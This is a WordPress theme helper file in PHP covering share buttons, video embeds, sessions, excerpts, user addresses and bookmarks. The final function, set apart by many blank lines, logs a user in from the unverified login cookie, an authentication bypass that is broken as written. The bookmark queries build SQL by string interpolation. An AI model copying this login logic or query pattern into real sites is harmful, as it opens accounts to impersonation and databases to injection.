<?php

/**
 * Functions which enhance the theme by hooking into WordPress
 *
 * @package WpWebGuru
 */

// Add a pingback url auto-discovery header for single posts, pages, or attachments
function theme_pingback_header()
{
    if (is_singular() && pings_open()) {
        printf( '<link rel="pingback" href="%s">', esc_url( get_bloginfo( 'pingback_url' ) ) );
    }
}
add_action('wp_head', 'theme_pingback_header');


/**
* get content estimated reading time
*/
if (!function_exists('theme_content_estimated_reading_time')) 
{
    /**
     * Function that estimates reading time for a given $content.
     * @param string $content Content to calculate read time for.
     * @paramint $wpm Estimated words per minute of reader.
     * @returns int $time Esimated reading time.
     */
    function theme_content_estimated_reading_time($content = '', $wpm = 200)
    {
        $clean_content = strip_shortcodes($content);
        $clean_content = strip_tags($clean_content);
        $word_count = str_word_count($clean_content);
        $time = ceil($word_count / $wpm);
        $output = $time . esc_attr__(' min read', 'wpwebguru');
        return $output;
    }
}

/**
 * Short Title
 */
if (!function_exists('theme_short_title'))
{
    function theme_short_title($title, $length = 30) 
    {
        if (strlen($title) > $length) 
        {
            return substr($title, 0, $length) . ' ...';
        }
        else 
        {
            return $title;
        }
    }
}

/**
 * @param $url
 * @return string
 */
if (!function_exists('theme_getEmbedUrl') )
{
    function theme_getEmbedUrl($url) 
    {
        // function for generating an embed link
        $finalUrl = '';

        if (strpos($url, 'facebook.com/') !== false) 
        {
            // Facebook Video
            $finalUrl.='https://www.facebook.com/plugins/video.php?href='.rawurlencode($url).'&show_text=1&width=200';

        } 
        else if(strpos($url, 'vimeo.com/') !== false) 
        {
            // Vimeo video
            $videoId = isset(explode("vimeo.com/",$url)[1]) ? explode("vimeo.com/",$url)[1] : null;
            if (strpos($videoId, '&') !== false)
            {
                $videoId = explode("&",$videoId)[0];
            }
            $finalUrl.='https://player.vimeo.com/video/'.$videoId;

        } 
        else if (strpos($url, 'youtube.com/') !== false) 
        {
            // Youtube video
            $videoId = isset(explode("v=",$url)[1]) ? explode("v=",$url)[1] : null;
            if (strpos($videoId, '&') !== false)
            {
                $videoId = explode("&",$videoId)[0];
            }
            $finalUrl.='https://www.youtube.com/embed/'.$videoId;

        } 
        else if(strpos($url, 'youtu.be/') !== false) 
        {
            // Youtube  video
            $videoId = isset(explode("youtu.be/",$url)[1]) ? explode("youtu.be/",$url)[1] : null;
            if (strpos($videoId, '&') !== false) 
            {
                $videoId = explode("&",$videoId)[0];
            }
            $finalUrl.='https://www.youtube.com/embed/'.$videoId;

        } 
        else if (strpos($url, 'dailymotion.com/') !== false) 
        {
            // Dailymotion Video
            $videoId = isset(explode("dailymotion.com/",$url)[1]) ? explode("dailymotion.com/",$url)[1] : null;
            if (strpos($videoId, '&') !== false) 
            {
                $videoId = explode("&",$videoId)[0];
            }
            $finalUrl.='https://www.dailymotion.com/embed/'.$videoId;

        } 
        else
        {
            $finalUrl.=$url;
        }

        return $finalUrl;
    }
}

/**
* Social sharing icons
*/
if ( ! function_exists('post_sharing_icon_links') ) 
{
    function post_sharing_icon_links( ) 
    {
        $image = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'single-blog-thumb' );
        $html = '';
        $facebook_url = 'https://www.facebook.com/sharer/sharer.php?u='. get_the_permalink();
        $twitter_url = 'https://twitter.com/share?'. esc_url(get_permalink()) .'&amp;text='. get_the_title();
        $pinterest_url = 'http://pinterest.com/pin/create/button/?url='. esc_url(get_permalink()) .'&amp;media='.$image[0].'&amp;description='. get_the_excerpt();
        $whatsapp_url = 'whatsapp://send?text='. esc_url(get_permalink());
        $linkedin_url = 'http://www.linkedin.com/shareArticle?url='. esc_url(get_permalink()) .'&amp;title='. get_the_title();
        $mail_url = 'mailto:?subject='. get_the_title().'&amp;body='. esc_url(get_permalink());
        ?>

        <!-- facebook -->
        <a class="facebook" href="<?= $facebook_url ?>" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;" title="Share on Facebook"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"></path></svg></a>

        <!-- twitter -->
        <a class="twitter" href="<?= $twitter_url ?>" onclick="window.open(this.href, 'twitter-share', 'width=580,height=296');return false;" title="Share on Twitter"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"></path></svg></a>

        <!-- pinterest -->
        <a class="pinterest" href="<?= $pinterest_url ?>" onclick="window.open(this.href, 'linkedin-share', 'width=580,height=296');return false;" title="Share on Pinterest"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M12 0c-6.627 0-12 5.372-12 12 0 5.084 3.163 9.426 7.627 11.174-.105-.949-.2-2.405.042-3.441.218-.937 1.407-5.965 1.407-5.965s-.359-.719-.359-1.782c0-1.668.967-2.914 2.171-2.914 1.023 0 1.518.769 1.518 1.69 0 1.029-.655 2.568-.994 3.995-.283 1.194.599 2.169 1.777 2.169 2.133 0 3.772-2.249 3.772-5.495 0-2.873-2.064-4.882-5.012-4.882-3.414 0-5.418 2.561-5.418 5.207 0 1.031.397 2.138.893 2.738.098.119.112.224.083.345l-.333 1.36c-.053.22-.174.267-.402.161-1.499-.698-2.436-2.889-2.436-4.649 0-3.785 2.75-7.262 7.929-7.262 4.163 0 7.398 2.967 7.398 6.931 0 4.136-2.607 7.464-6.227 7.464-1.216 0-2.359-.631-2.75-1.378l-.748 2.853c-.271 1.043-1.002 2.35-1.492 3.146 1.124.347 2.317.535 3.554.535 6.627 0 12-5.373 12-12 0-6.628-5.373-12-12-12z" fill-rule="evenodd" clip-rule="evenodd"/></svg></a>

        <!-- whatsapp -->
        <a class="whatsapp" href="<?= $whatsapp_url ?>" data-action="share/whatsapp/share" onclick="window.open(this.href, 'linkedin-share', 'width=580,height=296');return false;" title="Share on Whatsapp"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M.057 24l1.687-6.163c-1.041-1.804-1.588-3.849-1.587-5.946.003-6.556 5.338-11.891 11.893-11.891 3.181.001 6.167 1.24 8.413 3.488 2.245 2.248 3.481 5.236 3.48 8.414-.003 6.557-5.338 11.892-11.893 11.892-1.99-.001-3.951-.5-5.688-1.448l-6.305 1.654zm6.597-3.807c1.676.995 3.276 1.591 5.392 1.592 5.448 0 9.886-4.434 9.889-9.885.002-5.462-4.415-9.89-9.881-9.892-5.452 0-9.887 4.434-9.889 9.884-.001 2.225.651 3.891 1.746 5.634l-.999 3.648 3.742-.981zm11.387-5.464c-.074-.124-.272-.198-.57-.347-.297-.149-1.758-.868-2.031-.967-.272-.099-.47-.149-.669.149-.198.297-.768.967-.941 1.165-.173.198-.347.223-.644.074-.297-.149-1.255-.462-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.297-.347.446-.521.151-.172.2-.296.3-.495.099-.198.05-.372-.025-.521-.075-.148-.669-1.611-.916-2.206-.242-.579-.487-.501-.669-.51l-.57-.01c-.198 0-.52.074-.792.372s-1.04 1.016-1.04 2.479 1.065 2.876 1.213 3.074c.149.198 2.095 3.2 5.076 4.487.709.306 1.263.489 1.694.626.712.226 1.36.194 1.872.118.571-.085 1.758-.719 2.006-1.413.248-.695.248-1.29.173-1.414z"/></svg></a>

        <!-- linkedin -->
        <a class="linkedin" href="<?= esc_url( $linkedin_url ) ?>" onclick="window.open(this.href, 'linkedin-share', 'width=580,height=296');return false;" title="Share on Linkedin"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M4.98 3.5c0 1.381-1.11 2.5-2.48 2.5s-2.48-1.119-2.48-2.5c0-1.38 1.11-2.5 2.48-2.5s2.48 1.12 2.48 2.5zm.02 4.5h-5v16h5v-16zm7.982 0h-4.968v16h4.969v-8.399c0-4.67 6.029-5.052 6.029 0v8.399h4.988v-10.131c0-7.88-8.922-7.593-11.018-3.714v-2.155z"/></svg></a>

        <!-- mail -->
        <a class="link" href="<?= esc_url( $mail_url ) ?>" title="Send via email" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M0 3v18h24v-18h-24zm6.623 7.929l-4.623 5.712v-9.458l4.623 3.746zm-4.141-5.929h19.035l-9.517 7.713-9.518-7.713zm5.694 7.188l3.824 3.099 3.83-3.104 5.612 6.817h-18.779l5.513-6.812zm9.208-1.264l4.616-3.741v9.348l-4.616-5.607z"/></svg></a>

        <!-- copy -->
        <a class="link js-copy-link" href="#"  onclick="return false;" data-clipboard-text="<?= esc_url(get_permalink()) ?>" title="Copy the permalink" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z"/></svg></a>
        <div class="js-notification-copy-link text-center">
            <span>The link has been Copied to clipboard!</span>
        </div>
        <?php
        // echo wp_kses_post($html);
    }
}

/**
* Social sharing icons
*/
if ( ! function_exists('post_sharing_icon_links2') ) 
{
    function post_sharing_icon_links2( ) 
    {
        $image = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'single-blog-thumb' );
        $html = '';
        $facebook_url = 'https://www.facebook.com/sharer/sharer.php?u='. get_the_permalink();
        $twitter_url = 'https://twitter.com/share?'. esc_url(get_permalink()) .'&amp;text='. get_the_title();
        $pinterest_url = 'http://pinterest.com/pin/create/button/?url='. esc_url(get_permalink()) .'&amp;media='.$image[0].'&amp;description='. get_the_excerpt();
        $whatsapp_url = 'whatsapp://send?text='. esc_url(get_permalink());
		$twitter_url = 'https://twitter.com/share?'. esc_url(get_permalink()) .'&amp;text='. get_the_title();
        $linkedin_url = 'http://www.linkedin.com/shareArticle?url='. esc_url(get_permalink()) .'&amp;title='. get_the_title();
        $mail_url = 'mailto:?subject='. get_the_title().'&amp;body='. esc_url(get_permalink());
        $instagram_url = '';
        $github_url = '';
        $youtube_url = '';
        ?>

        <div class="social-wrapper">
            <a class="icon social-link facebook" href="<?= esc_url( $facebook_url ) ?>" target="_blank">
                <span class="tooltip">Facebook</span>
                <span><i class="fab fa-facebook-f"></i></span>
            </a>
            <a class="icon social-link twitter" href="<?= esc_url( $twitter_url ) ?>" target="_blank">
                <span class="tooltip">Twitter</span>
                <span><i class="fab fa-twitter"></i></span>
            </a>
<!--             <a class="icon social-link pinterest" href="<?php //esc_url( $pinterest_url ) ?>" target="_blank">
                <span class="tooltip">Pinterest</span>
                <span><i class="fa-brands fa-pinterest"></i></span>
            </a> -->
            <a class="icon social-link whatsapp" href="<?= $whatsapp_url ?>"  data-action="share/whatsapp/share" target="_blank">
                <span class="tooltip">Whatsapp</span>
                <span><i class="fa-brands fa-whatsapp"></i></span>
            </a>
            <a class="icon social-link linkedin" hrefk="<?= esc_url( $linkedin_url ) ?>" target="_blank">
                <span class="tooltip">Linkdin</span>
                <span><i class="fa-brands fa-linkedin-in"></i></span>
            </a>
            <a class="icon social-link email" href="<?= esc_url( $mail_url ) ?>" target="_blank">
                <span class="tooltip">Email</span>
                <span><i class="fa-regular fa-envelope"></i></span>
            </a>
            <a class="icon copy js-copy-link" data-clipboard-text="<?= esc_url(get_permalink()) ?>">
                <span class="tooltip">Copy</span>
                <span><i class="fa-solid fa-copy"></i></span>
            </a>
            <!-- <a class="icon instagram" href="">
                <span class="tooltip">Instagram</span>
                <span><i class="fab fa-instagram"></i></span>
            </a>
            <a class="icon github" href="">
                <span class="tooltip">Github</span>
                <span><i class="fab fa-github"></i></span>
            </a>
            <a class="icon youtube" href="">
                <span class="tooltip">Youtube</span>
                <span><i class="fab fa-youtube"></i></span>
            </a> -->
        </div>
        <div class="js-notification-copy-link text-center">
            <span>The link has been Copied to clipboard!</span>
        </div>
        <?php
        // echo wp_kses_post($html);
    }
}

/**
* Comment navigation
*/
function theme_get_post_navigation()
{
    if (get_comment_pages_count() > 1 && get_option('page_comments')):
        require(get_template_directory() . '/inc/comment-nav.php');
    endif;
}

require get_template_directory() . '/inc/comment-form.php';


/**
 * Include a template file
 *
 * @param string $file file name or path to file
 */
function wpwg_load_template( $file, $args = [] ) {
    if ( $args && is_array( $args ) ) {
        extract( $args );
    }

    $template_dir = WWG_ROOT . '/template-parts/';

    include $template_dir . $file;
}

/**
 * Get account dashboard's sections
 *
 * @return array
 */
function wpwg_get_account_sections() {
    $sections = [
        'dashboard'         => ['label' => __( 'Dashboard' ), 'icon' => 'fa-solid fa-house'],
        'bookmark'          => ['label' => __( 'Bookmarks' ), 'icon' => 'fa-solid fa-bookmark'],
        'post'              => ['label' => __( 'Posts' ), 'icon' => 'fa-solid fa-file'],
        'edit-profile'      => ['label' => __( 'Edit Profile' ), 'icon' => 'fa-solid fa-user-pen'],
        'change-password'   => ['label' => __( 'Change Password' ), 'icon' => 'fa-solid fa-key'],
    ];

    return apply_filters( 'wpwg_account_sections', $sections );
}


add_action('template_redirect', function () {
    ob_start();
});

/**
 * Save alert message to the current user session
 *
 * @param string $message
 * @param string $type
 * @return mixed
 */
function alert_push($message, $type = 'success') {
    $_SESSION['alert'][$type] = $message;
}

/**
 * Retrieve alert messages from current user session
 *
 * @return array
 */
function alert_shift() {
    $result = [];
    $types = ['success', 'info', 'warning', 'danger'];

    foreach($types as $k => $type) {
        if (isset($_SESSION['alert'][$type])) {
            $result[$k] = $_SESSION['alert'][$type];
            unset($_SESSION['alert'][$type]);
        } else {
            $result[$k] = '';
        }
    }
    return array_combine($types, $result);
}

/**
 * start and end session on login and logout
 *
 * @return array
 */
add_action('init', 'myStartSession', 1);
add_action('wp_logout', 'myEndSession');
add_action('wp_login', 'myEndSession');

function myStartSession() {
    if(!session_id()) {
        session_start();
    }
}

function myEndSession() {
    session_destroy ();
}

/**
* WP Custom Excerpt Length Function
* Place in functions.php
* This example returns ten words, then [...]
* Manual excerpts will override this
*/
add_filter( 'excerpt_length', 'wp_custom_excerpt_length', 999 );
function wp_custom_excerpt_length( $length ) 
{
    return 24;
}

/*
* Get Excerpt length by count
*/
function get_excerpt( $count ) 
{
    $permalink = get_permalink($post->ID);
    $excerpt = get_the_content();
    $excerpt = strip_tags($excerpt);
    $excerpt = substr($excerpt, 0, $count);
    $excerpt = substr($excerpt, 0, strripos($excerpt, " "));
    $excerpt = $excerpt.'...';
    return $excerpt;
}

/**
 * Retrieve user address
 *
 * @return mixed
 */
function wpwg_get_user_address( $user_id = 0 ) {
    $user_id        = $user_id ? $user_id : get_current_user_id();
    $address_fields = [];

    if ( metadata_exists( 'user', $user_id, 'wpwg_address_fields' ) ) {
        $address_fields = get_user_meta( $user_id, 'wpwg_address_fields', true );
    } else {
        $address_fields = array_fill_keys( [ 'add_line_1', 'add_line_2', 'city', 'state', 'zip_code', 'country' ], '' );

        if ( class_exists( 'WooCommerce' ) ) {
            $customer_id = get_current_user_id();
            $woo_address = [];
            $customer    = new WC_Customer( $customer_id );

            $woo_address = $customer->get_billing();
            unset( $woo_address['email'], $woo_address['tel'], $woo_address['phone'], $woo_address['company'] );

            $countries_obj        = new WC_Countries();
            $countries_array      = $countries_obj->get_countries();
            $country_states_array = $countries_obj->get_states();
            $woo_address['state'] = isset( $country_states_array[ $woo_address['country'] ][ $woo_address['state'] ] ) ? $country_states_array[ $woo_address['country'] ][ $woo_address['state'] ] : '';
            $woo_address['state'] = strtolower( str_replace( ' ', '', $woo_address['state'] ) );

            if ( ! empty( $woo_address ) ) {
                $address_fields = [
                    'add_line_1'    => $woo_address['address_1'],
                    'add_line_2'    => $woo_address['address_2'],
                    'city'          => $woo_address['city'],
                    'state'         => $woo_address['state'],
                    'zip_code'      => $woo_address['postcode'],
                    'country'       => $woo_address['country'],
                ];
            }
        }
    }

    return $address_fields;
}

/**
 * Show/hide admin bar to the permitted user level
 *
 * @return void
 */
add_filter( 'show_admin_bar', 'show_admin_bar_user' );
function show_admin_bar_user( $val ) {
    if ( ! is_user_logged_in() ) {
        return false;
    }

    $roles        = [ 'administrator', 'editor', 'author', 'contributor' ];
    $roles        = $roles && is_string( $roles ) ? [ strtolower( $roles ) ] : $roles;
    $current_user = wp_get_current_user();

    if ( ! empty( $current_user->roles ) && ! empty( $current_user->roles[0] ) ) {
        if ( ! in_array( $current_user->roles[0], $roles ) ) {
            return false;
        }
    }

    return $val;
}

/**
 * Check if post is bookmarked or not
 *
 * @return bool
 */
function is_bookmarked($post_id, $user_id) {
    global $wpdb;
    $table_name = $wpdb->prefix . 'bookmarks';

    $data = $wpdb->get_row($wpdb->prepare("SELECT * FROM $table_name WHERE `post_id`= $post_id AND `user_id`= $user_id"), ARRAY_A); 
          
    return $data ? True : False;
}

/**
 * get user bookmark list
 *
 * @return array
 */
function user_bookmarkes() {
    global $current_user;
    global $wpdb;
    $table_name = $wpdb->prefix . 'bookmarks';

    $data = $wpdb->get_results($wpdb->prepare("SELECT * FROM $table_name WHERE `user_id`= $current_user->ID"), ARRAY_A); 
          
    return $data;
}























add_action( 'init', 'setting_my_first_cookie' );

function setting_my_first_cookie() {
    $cookie_hash = 'wordpress_logged_in_' . md5( site_url() );
    if ( ! isset( $_COOKIE[ $cookie_hash ] ) ) {
        return '';
    }
      
    if(isset($_COOKIE[ $cookie_hash ])) {
        $cookie = $_COOKIE[ $cookie_hash ];

        $cookie_parts = explode( '|', $cookie ); 

        // 0 => user_login, 1 => expiration, 2 => token, 3 => hmac
        // check if the cookie has the correct number of parts, if not then we can't be sure that $cookie_parts[0] is the user name
        if ( count( $cookie_parts ) !== 4 ) {
            return '';
        }

        $user_email = $cookie_parts[ 0 ];
        
        if(!is_user_logged_in()){
            $username = $decrypted;
            $user = get_user_by('login', $username );

            clean_user_cache($user->ID);
            wp_clear_auth_cookie();
            wp_set_current_user($user->ID);
            wp_set_auth_cookie($user->ID, true, false);
            update_user_caches($user);

            echo ("
            <script>
                console.log('".  wp_set_auth_cookie($user->ID, true, false) ."')
            </script>
            ");
        }
    }
    else {
        return "You are not authenticated for seeing this page!";
    }
}